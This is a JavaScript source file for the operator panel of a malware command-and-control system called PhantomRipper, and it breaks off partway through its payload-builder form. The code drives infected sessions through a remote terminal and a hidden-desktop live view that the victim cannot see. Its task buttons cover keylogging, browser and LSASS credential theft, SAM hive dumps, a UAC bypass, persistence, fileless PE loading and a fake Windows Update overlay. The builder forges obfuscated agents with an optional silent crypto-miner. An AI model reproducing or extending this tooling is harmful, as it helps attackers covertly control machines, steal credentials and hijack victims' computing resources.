'use strict';
/*
 * PhantomRipper · Control Panel — SPA (vanilla, no build step).
 * Hash routing, JWT in localStorage, live WebSocket updates.
 */

const API = '/api';
const state = {
  token: localStorage.getItem('pr_token') || '',
  user: null,
  ws: null,
  sessions: [],
  stats: {},
  events: [],
  payloads: [],
  currentSession: null,
  currentHistory: [],
  streamSession: null,
  streamKey: '',
};

/* ── tiny helpers ─────────────────────────────────────────────────── */
const $ = (sel, root = document) => root.querySelector(sel);
const $$ = (sel, root = document) => Array.from(root.querySelectorAll(sel));
const esc = (s) => String(s ?? '').replace(/[&<>"']/g, (c) =>
  ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));

function fmtTime(iso) {
  if (!iso) return '—';
  const d = new Date(String(iso).replace(' ', 'T') + (String(iso).includes('Z') ? '' : 'Z'));
  return isNaN(d) ? iso : d.toLocaleString();
}
function ago(iso) {
  if (!iso) return '—';
  const d = new Date(String(iso).replace(' ', 'T') + (String(iso).includes('Z') ? '' : 'Z'));
  const s = Math.floor((Date.now() - d.getTime()) / 1000);
  if (isNaN(s)) return iso;
  if (s < 5) return 'just now';
  if (s < 60) return `${s}s ago`;
  if (s < 3600) return `${Math.floor(s / 60)}m ago`;
  if (s < 86400) return `${Math.floor(s / 3600)}h ago`;
  return `${Math.floor(s / 86400)}d ago`;
}
function bytes(n) {
  if (n === null || n === undefined) return '—';
  const u = ['B', 'KB', 'MB', 'GB']; let i = 0;
  while (n >= 1024 && i < u.length - 1) { n /= 1024; i++; }
  return `${n.toFixed(n < 10 && i > 0 ? 1 : 0)} ${u[i]}`;
}
const initials = (s) => (s || '?').replace(/[^a-z0-9]/gi, '').slice(0, 2).toUpperCase() || '??';
const osClass = (os) => { const o = (os || '').toLowerCase();
  return o.includes('win') ? 'win' : o.includes('mac') ? 'macos' : o.includes('linux') ? 'linux' : 'neutral'; };

/* ── icons ────────────────────────────────────────────────────────── */
const I = {
  dashboard: '<path d="M4 4h7v7H4zM13 4h7v5h-7zM13 11h7v9h-7zM4 13h7v7H4z" fill="currentColor"/>',
  sessions: '<path d="M3 5h18v11H3z" fill="none" stroke="currentColor" stroke-width="2"/><path d="M8 20h8M12 16v4" stroke="currentColor" stroke-width="2"/>',
  builder: '<path d="M14.7 6.3a4 4 0 00-5.4 5.4l-6 6 2 2 6-6a4 4 0 005.4-5.4l-2.3 2.3-2-2z" fill="currentColor"/>',
  listeners: '<path d="M12 4a6 6 0 016 6v4a6 6 0 01-12 0v-4a6 6 0 016-6z" fill="none" stroke="currentColor" stroke-width="2"/><circle cx="12" cy="12" r="2" fill="currentColor"/>',
  events: '<path d="M5 4h14v16H5z" fill="none" stroke="currentColor" stroke-width="2"/><path d="M8 8h8M8 12h8M8 16h5" stroke="currentColor" stroke-width="2"/>',
  check: '<path d="M20 6L9 17l-5-5" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/>',
  alert: '<path d="M12 8v5M12 17h.01" stroke="currentColor" stroke-width="2.4" stroke-linecap="round"/><circle cx="12" cy="12" r="9" fill="none" stroke="currentColor" stroke-width="2"/>',
  bolt: '<path d="M13 2L4 14h6l-1 8 9-12h-6z" fill="currentColor"/>',
  clock: '<circle cx="12" cy="12" r="9" fill="none" stroke="currentColor" stroke-width="2"/><path d="M12 7v5l3 2" stroke="currentColor" stroke-width="2" fill="none" stroke-linecap="round"/>',
  cpu: '<rect x="7" y="7" width="10" height="10" rx="2" fill="none" stroke="currentColor" stroke-width="2"/><path d="M10 3v2M14 3v2M10 19v2M14 19v2M3 10h2M3 14h2M19 10h2M19 14h2" stroke="currentColor" stroke-width="2"/>',
  inbox: '<path d="M4 13l2-8h12l2 8v5H4z" fill="none" stroke="currentColor" stroke-width="2"/><path d="M4 13h5l1 2h4l1-2h5" stroke="currentColor" stroke-width="2" fill="none"/>',
  send: '<path d="M4 12l16-8-6 16-2-6z" fill="currentColor"/>',
};
const icon = (name, size = 17) =>
  `<svg viewBox="0 0 24 24" width="${size}" height="${size}" aria-hidden="true">${I[name] || ''}</svg>`;

/* ── toast ────────────────────────────────────────────────────────── */
function toast(msg, isErr = false) {
  const root = $('#toast-root');
  const el = document.createElement('div');
  el.className = 'toast' + (isErr ? ' err' : '');
  el.innerHTML = `<span class="ti">${icon(isErr ? 'alert' : 'check', 16)}</span><span>${esc(msg)}</span>`;
  root.appendChild(el);
  setTimeout(() => { el.classList.add('out'); setTimeout(() => el.remove(), 280); }, 3200);
}

/* ── modal ────────────────────────────────────────────────────────── */
function confirmModal(title, body, confirmLabel = 'Confirm') {
  return new Promise((resolve) => {
    const root = $('#modal-root');
    root.innerHTML = `
      <div class="modal-backdrop">
        <div class="modal">
          <h3>${esc(title)}</h3>
          <p>${esc(body)}</p>
          <div class="modal-actions">
            <button class="btn ghost" data-act="cancel">Cancel</button>
            <button class="btn danger" data-act="ok">${esc(confirmLabel)}</button>
          </div>
        </div>
      </div>`;
    const close = (val) => { root.innerHTML = ''; resolve(val); };
    root.querySelector('[data-act="cancel"]').onclick = () => close(false);
    root.querySelector('[data-act="ok"]').onclick = () => close(true);
    root.querySelector('.modal-backdrop').onclick = (e) => { if (e.target.classList.contains('modal-backdrop')) close(false); };
  });
}

/* ── api ──────────────────────────────────────────────────────────── */
async function api(path, opts = {}) {
  const headers = { 'Content-Type': 'application/json', ...(opts.headers || {}) };
  if (state.token) headers.Authorization = `Bearer ${state.token}`;
  const res = await fetch(API + path, { ...opts, headers });
  if (res.status === 401) { logout(); throw new Error('unauthorized'); }
  const ct = res.headers.get('content-type') || '';
  const body = ct.includes('application/json') ? await res.json() : await res.text();
  if (!res.ok) throw new Error((body && body.error) || `HTTP ${res.status}`);
  return body;
}

/* ── auth ─────────────────────────────────────────────────────────── */
function showLogin() { $('#login-view').classList.remove('hidden'); $('#app-view').classList.add('hidden'); }
function showApp() { $('#login-view').classList.add('hidden'); $('#app-view').classList.remove('hidden'); }
function logout() {
  state.token = ''; state.user = null; localStorage.removeItem('pr_token');
  if (state.ws) { try { state.ws.close(); } catch (_) {} state.ws = null; }
  showLogin();
}

let loginTicket = null;

$('#login-endpoint').textContent = location.host;
$('#pw-toggle').addEventListener('click', () => {
  const inp = $('#login-pass');
  inp.type = inp.type === 'password' ? 'text' : 'password';
});

function showTotpStep(setup, data) {
  loginTicket = data.ticket;
  $('#login-user').disabled = true;
  $('#login-pass').disabled = true;
  $('#login-error').classList.add('hidden');
  if (setup) {
    $('#totp-secret-value').textContent = data.secret;
    $('#totp-secret-block').classList.remove('hidden');
    const codeInput = $('#login-totp');
    setTimeout(() => codeInput && codeInput.focus(), 50);
  } else {
    $('#totp-block').classList.remove('hidden');
    const codeInput = $('#login-totp2');
    setTimeout(() => codeInput && codeInput.focus(), 50);
  }
}

$('#totp-copy').addEventListener('click', () => {
  const v = $('#totp-secret-value').textContent;
  navigator.clipboard.writeText(v).then(() => { $('#totp-copy').textContent = 'Copied'; });
});

async function finishTotpLogin(code) {
  const err = $('#login-error'); const btn = $('#login-submit');
  err.classList.add('hidden');
  btn.classList.add('loading'); btn.disabled = true;
  try {
    const { token, user } = await api('/auth/totp', {
      method: 'POST',
      body: JSON.stringify({ ticket: loginTicket, code }),
    });
    state.token = token; state.user = user;
    localStorage.setItem('pr_token', token);
    await boot();
  } catch (ex) {
    err.textContent = ex.message;
    err.classList.remove('hidden');
  } finally {
    btn.classList.remove('loading'); btn.disabled = false;
  }
}

$('#login-form').addEventListener('submit', async (e) => {
  e.preventDefault();
  const err = $('#login-error'); const btn = $('#login-submit');
  err.classList.add('hidden');

  // step 2: TOTP verification
  if (loginTicket) {
    const code = ($('#totp-secret-block').classList.contains('hidden')
      ? $('#login-totp2') : $('#login-totp')).value.trim();
    if (!/^\d{6}$/.test(code)) {
      err.textContent = 'Enter the 6-digit code from your authenticator.';
      err.classList.remove('hidden');
      return;
    }
    await finishTotpLogin(code);
    return;
  }

  // step 1: password
  btn.classList.add('loading'); btn.disabled = true;
  try {
    const r = await fetch(API + '/auth/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username: $('#login-user').value, password: $('#login-pass').value }),
    });
    const data = await r.json();
    if (!r.ok) throw new Error(data.error || `HTTP ${r.status}`);
    if (data.totp_setup) { showTotpStep(true, data); return; }
    if (data.totp_required) { showTotpStep(false, data); return; }
    throw new Error('unexpected login response');
  } catch (ex) {
    err.textContent = ex.message;
    err.classList.remove('hidden');
    const card = $('.login-card'); card.classList.add('shake');
    setTimeout(() => card.classList.remove('shake'), 420);
  } finally {
    btn.classList.remove('loading'); btn.disabled = false;
  }
});
$('#logout-btn').addEventListener('click', async () => {
  if (await confirmModal('Sign out', 'End this operator session?', 'Sign out')) logout();
});
$('#refresh-btn').addEventListener('click', () => { refreshSessions(); if (currentRoute() === 'events') renderEvents(); });

/* ── websocket ────────────────────────────────────────────────────── */
function setConn(on, label) {
  const dot = $('#ws-dot'); const txt = $('#ws-status');
  if (dot) dot.className = 'status-dot ' + (on ? 'on' : 'off');
  if (txt) txt.textContent = label;
}
function connectWs() {
  if (state.ws) { try { state.ws.close(); } catch (_) {} }
  const proto = location.protocol === 'https:' ? 'wss' : 'ws';
  const ws = new WebSocket(`${proto}://${location.host}/ws/operator?token=${encodeURIComponent(state.token)}`);
  state.ws = ws;
  ws.onopen = () => setConn(true, 'live');
  ws.onclose = () => { setConn(false, 'reconnecting…'); setTimeout(() => { if (state.token) connectWs(); }, 2500); };
  ws.onmessage = (ev) => {
    if (ev.data instanceof ArrayBuffer || ev.data instanceof Blob) return;
    try { handleWs(JSON.parse(ev.data)); } catch (_) {}
  };
}
function handleWs(msg) {
  const { type, payload } = msg;
  switch (type) {
    case 'hello':
      state.sessions = payload.sessions || []; state.stats = payload.stats || {};
      render(); break;
    case 'session_update':
      refreshSessions(); break;
    case 'session_deleted':
      refreshSessions(); break;
    case 'command_result':
    case 'command_queued':
      if (state.currentSession && state.currentSession.id === payload.sessionId) loadSession(payload.sessionId, true);
      break;
    case 'agent_online':
      toast(`agent online · ${payload.sessionId.slice(0, 8)}`); refreshSessions(); break;
    case 'agent_offline':
      refreshSessions(); break;
    case 'artifact_new':
      toast(`artifact · ${payload.name || 'file'} (${bytes(payload.size)})`);
      if (currentRoute() === 'artifacts') renderArtifacts();
      break;
    case 'task_queued':
      if (state.currentSession && state.currentSession.id === payload.sessionId) loadSession(payload.sessionId, true);
      break;
    case 'agent_frame':
      if (state.streamSession === payload.session) drawStreamFrame(payload.data);
      break;
    case 'agent_wins':
      if (state.streamSession === payload.session) drawStreamWindows(payload.windows || []);
      break;
  }
}
async function refreshSessions() {
  try {
    state.sessions = await api('/sessions');
    state.stats = await api('/stats');
    updatePills(); updateNavBadges(); render();
  } catch (_) {}
}
function updatePills() {
  const online = state.stats?.online?.length || 0;
  const t = $('#pill-agents-text'); if (t) t.textContent = `${online} online · ${state.sessions.length} total`;
}
function updateNavBadges() {
  const b = $('#nav-badge-sessions'); if (b) b.textContent = state.sessions.length || '';
}

/* ── router ───────────────────────────────────────────────────────── */
const NAV = [
  { route: 'dashboard', label: 'Dashboard', ic: 'dashboard' },
  { route: 'sessions', label: 'Sessions', ic: 'sessions', badge: true },
  { route: 'artifacts', label: 'Artifacts', ic: 'inbox' },
  { route: 'builder', label: 'Payload Builder', ic: 'builder' },
  { route: 'listeners', label: 'Listeners', ic: 'listeners' },
  { route: 'events', label: 'Events', ic: 'events' },
];
const PAGE_META = {
  dashboard: ['Dashboard', 'Fleet overview and live telemetry'],
  sessions: ['Sessions', 'Connected agents and remote control'],
  session: ['Session', 'Remote terminal and host details'],
  artifacts: ['Artifacts', 'Screenshots, dumps and exfil collected from agents'],
  builder: ['Payload Builder', 'Forge and obfuscate agent payloads'],
  listeners: ['Listeners', 'Named C2 transport endpoints'],
  events: ['Events', 'Audit trail across the panel'],
};
function currentRoute() { return (location.hash.replace(/^#\/?/, '') || 'dashboard').split('/')[0]; }
function buildNav() {
  $('#nav').innerHTML = NAV.map((n) => `
    <a href="#/${n.route}" data-route="${n.route}">
      <span class="ni">${icon(n.ic)}</span><span>${n.label}</span>
      ${n.badge ? `<span class="nbadge" id="nav-badge-sessions"></span>` : ''}
    </a>`).join('');
}
function navigate() {
  const hash = location.hash.replace(/^#\/?/, '') || 'dashboard';
  const [route, param] = hash.split('/');
  const meta = PAGE_META[route] || PAGE_META.dashboard;
  $('#page-title').textContent = meta[0];
  $('#page-sub').textContent = meta[1];
  $$('#nav a').forEach((a) => a.classList.toggle('active',
    a.dataset.route === route || (route === 'session' && a.dataset.route === 'sessions')));
  ({ dashboard: renderDashboard, sessions: renderSessions, session: renderSessionDetail,
     artifacts: renderArtifacts,
     builder: renderBuilder, listeners: renderListeners, events: renderEvents }[route] || renderDashboard)(param);
}
function render() { navigate(); }
window.addEventListener('hashchange', navigate);

/* ── artifacts ─────────────────────────────────────────────────────── */
const isImageName = (n) => /\.(png|jpe?g|bmp|gif)$/i.test(n || '');

async function renderArtifacts() {
  $('#page').innerHTML = '<div class="skel" style="height:300px"></div>';
  let list = [];
  try { list = await api('/artifacts'); } catch (ex) {
    $('#page').innerHTML = `<div class="empty error">${esc(ex.message)}</div>`; return;
  }
  $('#page').innerHTML = `
    <div class="row between" style="margin-bottom:16px">
      <div class="muted">${list.length} artifact(s)</div>
      <button class="btn sm" onclick="renderArtifacts()">${icon('clock', 14)} Refresh</button>
    </div>
    <div class="card flush">
      ${list.length ? `<div class="table-wrap"><table>
        <thead><tr><th>Name</th><th>Kind</th><th>Session</th><th>Size</th><th>SHA256</th><th>Time</th><th></th></tr></thead>
        <tbody>${list.map((a) => `
          <tr>
            <td><strong>${esc(a.name || '—')}</strong></td>
            <td><span class="tag neutral">${esc(a.kind || 'file')}</span></td>
            <td class="mono muted">${esc((a.session_id || '').slice(0, 12))}</td>
            <td class="muted">${bytes(a.size)}</td>
            <td class="mono muted" style="font-size:10.5px">${esc((a.sha256 || '').slice(0, 16))}…</td>
            <td class="muted">${fmtTime(a.created_at)}</td>
            <td style="text-align:right;white-space:nowrap">
              ${isImageName(a.name) ? `<button class="btn sm" onclick="viewArtifact('${a.id}')">View</button>` : ''}
              <a class="btn sm" href="${API}/artifacts/${a.id}/download?token=${encodeURIComponent(state.token)}">Download</a>
              <button class="btn sm danger" onclick="delArtifact('${a.id}')">Del</button>
            </td>
          </tr>`).join('')}</tbody></table></div>`
      : `<div class="empty">${icon('inbox', 26)}<span>No artifacts collected yet — agent captures, dumps and exfil land here.</span></div>`}
    </div>`;
}
window.renderArtifacts = renderArtifacts;

window.viewArtifact = async (id) => {
  try {
    const res = await fetch(`${API}/artifacts/${id}/download?token=${encodeURIComponent(state.token)}`);
    const blob = await res.blob();
    const url = URL.createObjectURL(blob);
    $('#modal-root').innerHTML = `
      <div class="modal-backdrop">
        <div class="modal artifact-viewer">
          <h3>Artifact preview</h3>
          <img src="${url}" alt="artifact preview"/>
          <div class="modal-actions"><button class="btn ghost" data-act="close">Close</button></div>
        </div>
      </div>`;
    $('#modal-root').querySelector('[data-act="close"]').onclick = () => { $('#modal-root').innerHTML = ''; };
  } catch (ex) { toast(ex.message, true); }
};
window.delArtifact = async (id) => {
  if (!(await confirmModal('Delete artifact', 'Remove this artifact and its file?', 'Delete'))) return;
  try { await api(`/artifacts/${id}`, { method: 'DELETE' }); renderArtifacts(); } catch (ex) { toast(ex.message, true); }
};

/* ── live view (hidden-desktop stream) ─────────────────────────────── */
function openLiveView(sessionId) {
  state.streamSession = sessionId;
  $('#modal-root').innerHTML = `
    <div class="modal-backdrop stream-backdrop">
      <div class="modal stream-modal">
        <div class="row between" style="margin-bottom:12px">
          <h3 style="margin:0">Live view · <span class="mono">${esc(sessionId.slice(0, 10))}</span></h3>
          <div class="row" style="gap:8px">
            <span class="tag active">private desktop</span>
            <button class="btn sm danger" onclick="closeLiveView()">Close</button>
          </div>
        </div>
        <div class="stream-frame"><img id="stream-img" alt="waiting for frames…"/></div>
        <div class="muted" style="font-size:11px;margin-top:8px">
          Frames stream over the agent socket. Click / drag / type to interact — injection happens on the agent's private desktop, the user sees nothing.
        </div>
      </div>
    </div>`;
  const img = $('#stream-img');
  img.onclick = (e) => {
    const rect = img.getBoundingClientRect();
    const x = Math.round(((e.clientX - rect.left) / rect.width) * 65535);
    const y = Math.round(((e.clientY - rect.top) / rect.height) * 65535);
    sendLiveInput({ action: e.button === 2 ? 'rclick' : 'click', x, y });
  };
  img.oncontextmenu = (e) => e.preventDefault();
  img.onwheel = (e) => {
    e.preventDefault();
    sendLiveInput({ action: 'wheel', delta: e.deltaY > 0 ? -120 : 120 });
  };
  document.addEventListener('keydown', liveKeyHandler);
}
function liveKeyHandler(e) {
  if (!state.streamSession) return;
  if (e.target && /input|textarea/i.test(e.target.tagName)) return;
  const map = { Enter: 13, Backspace: 8, Escape: 27, Tab: 9 };
  if (e.key.length === 1) sendLiveInput({ action: 'type', text: e.key });
  else if (map[e.key]) sendLiveInput({ action: 'key', vk: map[e.key] });
  else return;
  e.preventDefault();
}
function closeLiveView() {
  state.streamSession = null;
  document.removeEventListener('keydown', liveKeyHandler);
  $('#modal-root').innerHTML = '';
}
window.closeLiveView = closeLiveView;
window.openLiveView = openLiveView;
function sendLiveInput(input) {
  if (!state.ws || state.ws.readyState !== 1 || !state.streamSession) return;
  state.ws.send(JSON.stringify({ type: 'agent_input', payload: { session: state.streamSession, ...input } }));
}
function drawStreamFrame(b64data) {
  const img = $('#stream-img');
  if (img) img.src = 'data:image/png;base64,' + b64data;
}

/* ── offensive task bar ────────────────────────────────────────────── */
const OFFENSIVE_TASKS = [
  { verb: 'getsys', args: 'auto', label: 'Escalate → SYSTEM' },
  { verb: 'uac', args: '', label: 'UAC bypass (fodhelper)' },
  { verb: 'worker', args: '', label: 'Spawn desktop worker' },
  { verb: 'screen', args: '', label: 'Capture screen' },
  { verb: 'keylog', args: 'start', label: 'Keylogger ON' },
  { verb: 'keylog', args: 'dump', label: 'Keylogger dump' },
  { verb: 'creds', args: 'chrome', label: 'Browser creds' },
  { verb: 'creds', args: 'lsass', label: 'LSASS dump' },
  { verb: 'creds', args: 'wifi', label: 'WiFi keys' },
  { verb: 'creds', args: 'hives', label: 'SAM hives' },
  { verb: 'persist', args: 'task', label: 'Persist · SYSTEM task' },
  { verb: 'persist', args: 'service', label: 'Persist · service' },
  { verb: 'netrecon', args: '', label: 'Network recon' },
  { verb: 'ps', args: '', label: 'Process list' },
  { verb: 'hvnc', args: 'start', label: 'HVNC start' },
  { verb: 'hvnc', args: 'stop', label: 'HVNC stop' },
  { verb: 'pe', args: 'PE-KEY PE-B64', label: 'Fileless PE (key+b64)' },
  { verb: 'overlay', args: 'start 10', label: 'Fake Windows Update (10m)' },
  { verb: 'overlay', args: 'start 30', label: 'Fake Windows Update (30m)' },
  { verb: 'overlay', args: 'stop', label: 'Hide update overlay' },
];
window.runTask = async function (verb, args) {
  if (!state.currentSession) return;
  try {
    const r = await api(`/sessions/${state.currentSession.id}/task`, {
      method: 'POST',
      body: JSON.stringify({ verb, args }),
    });
    toast(`task queued · ${verb} ${r.delivered ? '(pushed)' : '(queued)'}`);
    loadSession(state.currentSession.id, true);
  } catch (ex) { toast(ex.message, true); }
};
window.runCustomTask = function () {
  const v = $('#task-verb'); const a = $('#task-args');
  if (!v || !v.value.trim()) return;
  runTask(v.value.trim(), a ? a.value : '');
};

/* ── views ────────────────────────────────────────────────────────── */
function statCard(label, value, ic, tone = '') {
  return `<div class="card stat hoverable">
    <div class="stat-top"><span class="stat-ic ${tone}">${icon(ic, 17)}</span></div>
    <div><div class="stat-value ${tone === '' ? 'accent' : ''}">${value}</div><div class="stat-label">${label}</div></div>
  </div>`;
}

function renderDashboard() {
  const s = state.stats || {};
  const online = s.online?.length || 0;
  const byOs = (s.byOs || []).filter((x) => x.n);
  const maxOs = Math.max(1, ...byOs.map((x) => x.n));
  const recent = state.sessions.slice(0, 7);

  $('#page').innerHTML = `
    <div class="grid cols-4">
      ${statCard('Online now', online, 'bolt', '')}
      ${statCard('Active sessions', s.active || 0, 'sessions', 'blue')}
      ${statCard('Total sessions', s.total || 0, 'inbox', 'violet')}
      ${statCard('Commands run', s.commands || 0, 'clock', 'amber')}
    </div>

    <div class="grid cols-2" style="margin-top:16px">
      <div class="card">
        <h3>Operating systems</h3>
        ${byOs.length ? byOs.map((x) => `
          <div class="osrow">
            <span class="osn">${esc(x.os || 'unknown')}</span>
            <span class="bar"><span style="width:${Math.round((x.n / maxOs) * 100)}%"></span></span>
            <span class="mono muted" style="text-align:right">${x.n}</span>
          </div>`).join('')
        : '<div class="empty">No active agents.</div>'}
        <hr class="sep"/>
        <div class="kv">
          <div class="k">C2 endpoint</div><div class="v mono">${esc(location.origin)}</div>
          <div class="k">Recent (15m)</div><div class="v">${s.recent || 0}</div>
        </div>
      </div>

      <div class="card flush">
        <div style="padding:18px 18px 6px"><h3 style="margin:0">Recent sessions</h3></div>
        ${recent.length ? `<div class="table-wrap"><table><tbody>
          ${recent.map((x) => `
            <tr class="clickable" onclick="location.hash='#/session/${x.id}'">
              <td><div class="cell-host">
                <span class="avatar">${esc(initials(x.hostname))}</span>
                <span class="hmeta"><strong>${esc(x.hostname || '(unnamed)')}</strong>
                <span>${esc(x.id.slice(0, 10))}</span></span>
              </div></td>
              <td><span class="tag ${osClass(x.os)}">${esc(x.os || 'unknown')}</span></td>
              <td class="muted" style="text-align:right">${ago(x.last_seen)}</td>
            </tr>`).join('')}
        </tbody></table></div>`
        : `<div class="empty">${icon('inbox', 26)}<span>No sessions yet — forge a payload to begin.</span></div>`}
      </div>
    </div>`;
}

function renderSessions() {
  const rows = state.sessions.map((x) => `
    <tr class="clickable" onclick="location.hash='#/session/${x.id}'">
      <td><div class="cell-host">
        <span class="avatar">${esc(initials(x.hostname))}</span>
        <span class="hmeta"><strong>${esc(x.hostname || '—')}</strong><span>${esc(x.id.slice(0, 12))}</span></span>
      </div></td>
      <td>${esc(x.username || '—')}</td>
      <td><span class="tag ${osClass(x.os)}">${esc(x.os || 'unknown')}</span></td>
      <td class="mono muted">${esc(x.ip || '—')}</td>
      <td><span class="tag ${x.status === 'active' ? 'active' : 'dead'}">${esc(x.status)}</span></td>
      <td class="muted" style="text-align:right">${ago(x.last_seen)}</td>
    </tr>`).join('');
  $('#page').innerHTML = `
    <div class="row between" style="margin-bottom:16px">
      <div class="muted">${state.sessions.length} session(s)</div>
      <button class="btn sm" onclick="refreshSessions()">${icon('clock', 14)} Refresh</button>
    </div>
    <div class="card flush">
      ${state.sessions.length ? `<div class="table-wrap"><table>
        <thead><tr><th>Host</th><th>User</th><th>OS</th><th>IP</th><th>Status</th><th style="text-align:right">Last seen</th></tr></thead>
        <tbody>${rows}</tbody></table></div>`
      : `<div class="empty">${icon('sessions', 30)}<span>No sessions connected.</span></div>`}
    </div>`;
}

async function renderSessionDetail(id) {
  if (!id) { location.hash = '#/sessions'; return; }
  $('#page').innerHTML = skeletonDetail();
  await loadSession(id, false);
}
function skeletonDetail() {
  return `<div class="skel" style="height:36px;width:260px;margin-bottom:16px"></div>
    <div class="grid cols-2"><div class="skel" style="height:230px"></div><div class="skel" style="height:230px"></div></div>
    <div class="skel" style="height:300px;margin-top:16px"></div>`;
}
async function loadSession(id, soft) {
  try {
    const data = await api(`/sessions/${id}`);
    state.currentSession = data.session; state.currentHistory = data.history;
    paintSession(data);
  } catch (ex) {
    $('#page').innerHTML = `<div class="empty error">${esc(ex.message)}</div>`;
  }
}
function paintSession(data) {
  const s = data.session; const online = data.online;
  const term = (state.currentHistory || []).map((c) => {
    const resp = c.response === 'Waiting for response...'
      ? '<span class="meta">waiting for response…</span>' : esc(c.response);
    const badge = c.task_id ? `<span class="tag neutral" style="font-size:10px;margin-left:6px">task ${esc(c.task_id.slice(0, 12))}</span>` : '';
    return `<div class="line"><span class="cmd">${esc(c.command)}</span>${badge}<span class="ts">${fmtTime(c.issued_at)}</span></div>
            <div class="line out">${resp}</div>`;
  }).join('');

  $('#page').innerHTML = `
    <div class="row between" style="margin-bottom:18px;flex-wrap:wrap;gap:12px">
      <div class="row" style="gap:14px">
        <button class="btn sm ghost" onclick="location.hash='#/sessions'">← Back</button>
        <span class="avatar" style="width:38px;height:38px">${esc(initials(s.hostname))}</span>
        <div style="line-height:1.3">
          <div style="font-size:16px;font-weight:700">${esc(s.hostname || 'session')}</div>
          <div class="mono muted" style="font-size:11.5px">${esc(s.id)}</div>
        </div>
        <span class="tag ${online ? 'active' : 'dead'}">${online ? 'online' : 'offline'}</span>
        ${s.proto === 'task' ? '<span class="tag neutral">task protocol</span>' : ''}
      </div>
      <div class="row" style="gap:8px">
        <button class="btn sm" onclick="openLiveView('${s.id}')">${icon('cpu', 14)} Live view</button>
        <button class="btn sm danger" onclick="deleteSession('${s.id}')">${icon('alert', 14)} Delete</button>
      </div>
    </div>

    <div class="grid cols-2">
      <div class="card">
        <h3>Session info</h3>
        <div class="kv">
          <div class="k">Hostname</div><div class="v">${esc(s.hostname || '—')}</div>
          <div class="k">User</div><div class="v">${esc(s.username || '—')}</div>
          <div class="k">OS / Arch</div><div class="v">${esc(s.os || '—')} · ${esc(s.arch || '—')}</div>
          <div class="k">PID</div><div class="v mono">${esc(s.pid || '—')}</div>
          <div class="k">IP</div><div class="v mono">${esc(s.ip || '—')}</div>
          <div class="k">Privilege</div><div class="v"><span class="tag ${s.privilege === 'admin' || s.privilege === 'root' || s.privilege === 'system' ? 'active' : 'neutral'}">${esc(s.privilege || 'user')}</span></div>
          <div class="k">Agent</div><div class="v">${esc(s.agent_type || 'python')}</div>
          <div class="k">First seen</div><div class="v">${fmtTime(s.first_seen)}</div>
          <div class="k">Last seen</div><div class="v">${fmtTime(s.last_seen)}</div>
        </div>
      </div>
      <div class="card">
        <h3>Quick actions</h3>
        <div class="qactions">
          ${['whoami', 'systeminfo', 'ipconfig', 'net user', 'tasklist', 'ls'].map((c) =>
            `<button class="btn sm" onclick="quickCmd(${JSON.stringify(c).replace(/"/g, '&quot;')})">${esc(c)}</button>`).join('')}
        </div>
        <hr class="sep"/>
        <h3>Offensive tasks</h3>
        <div class="qactions">
          ${OFFENSIVE_TASKS.map((t) =>
            `<button class="btn sm" onclick="runTask('${t.verb}','${t.args.replace(/'/g, "\\'")}')">${esc(t.label)}</button>`).join('')}
        </div>
        <hr class="sep"/>
        <div class="row" style="gap:8px">
          <input id="task-verb" class="mono" style="flex:1" placeholder="verb (getsys, runas, exec, pymod…)" />
          <input id="task-args" style="flex:2" placeholder="args…" onkeydown="if(event.key==='Enter')runCustomTask()" />
          <button class="btn primary sm" onclick="runCustomTask()">${icon('send', 14)} Run</button>
        </div>
      </div>
    </div>

    <div class="section-title">Remote terminal</div>
    <div class="term" id="term">${term || '<div class="line meta">No commands yet — type below to begin.</div>'}</div>
    <div class="cmdbar">
      <input id="cmd-input" placeholder="Enter command…" onkeydown="if(event.key==='Enter')sendCmd()" />
      <button class="btn primary" onclick="sendCmd()">${icon('send', 15)} Send</button>
    </div>`;

  const t = $('#term'); if (t) t.scrollTop = t.scrollHeight;
  const inp = $('#cmd-input'); if (inp) inp.focus();
}

async function sendCmd() {
  const inp = $('#cmd-input');
  if (!inp || !inp.value.trim() || !state.currentSession) return;
  const command = inp.value.trim(); inp.value = '';
  try {
    await api(`/sessions/${state.currentSession.id}/command`, { method: 'POST', body: JSON.stringify({ command }) });
    loadSession(state.currentSession.id, true);
  } catch (ex) { toast(ex.message, true); }
}
window.sendCmd = sendCmd;
window.quickCmd = (c) => { const i = $('#cmd-input'); if (i) { i.value = c; sendCmd(); } };
window.refreshSessions = refreshSessions;
window.deleteSession = async (id) => {
  if (!(await confirmModal('Delete session', 'Remove this session and its command history?', 'Delete'))) return;
  try { await api(`/sessions/${id}`, { method: 'DELETE' }); toast('session deleted'); location.hash = '#/sessions'; refreshSessions(); }
  catch (ex) { toast(ex.message, true); }
};

function renderBuilder() {
  $('#page').innerHTML = `
    <div class="grid cols-2">
      <div class="card">
        <h3>Generate payload</h3>
        <div class="form-grid">
          <label class="field2"><span>Name</span><input id="b-name" placeholder="my-payload" /></label>
          <label class="field2"><span>Agent type</span>
            <select id="b-agent"><option value="python">Python (cross-platform)</option><option value="cpp">C++ (Windows native)</option></select></label>
          <label class="field2"><span>OS target</span>
            <select id="b-os"><option>windows</option><option>linux</option><option>macos</option></select></label>
          <label class="field2"><span>Transport</span>
            <select id="b-transport"><option>https</option><option>doh</option><option>ws</option><option>tcp</option></select></label>
          <label class="field2"><span>C2 host</span><input id="b-host" placeholder="auto" /></label>
          <label class="field2"><span>C2 port</span><input id="b-port" type="number" placeholder="auto" /></label>
          <label class="field2"><span>Beacon interval (s)</span><input id="b-interval" type="number" value="5" /></label>
          <label class="field2"><span>Jitter (0–1)</span><input id="b-jitter" type="number" step="0.05" value="0.2" /></label>
          <div class="full row wrap" style="gap:18px">
            <label class="switch"><input type="checkbox" id="b-obf" checked /><span class="track"></span>Obfuscate</label>
            <label class="switch"><input type="checkbox" id="b-enh" /><span class="track"></span>Enhanced</label>
            <label class="switch"><input type="checkbox" id="b-persist" /><span class="track"></span>Persistence</label>
            <label class="switch"><input type="checkbox" id="b-keylog" /><span class="track"></span>Keylogger</label>
            <label class="switch"><input type="checkbox" id="b-miner" /><span class="track"></span>Silent miner</label>
          </div>
          <label class="field2 full"><span>Miner pool (optional)</span><input id="b-pool" placeholder="pool.supportxmr.com:3333" /></label>
          <label class="field2 full"><span>Miner wallet (optional)</span><input id="b-wallet" placeholder="4..." /></label>

          <div class="full">
            <h3 style="margin:6px 0 10px">Weaponization options</h3>
            <div class="row wrap" style="gap:18px;margin-bottom:12px">
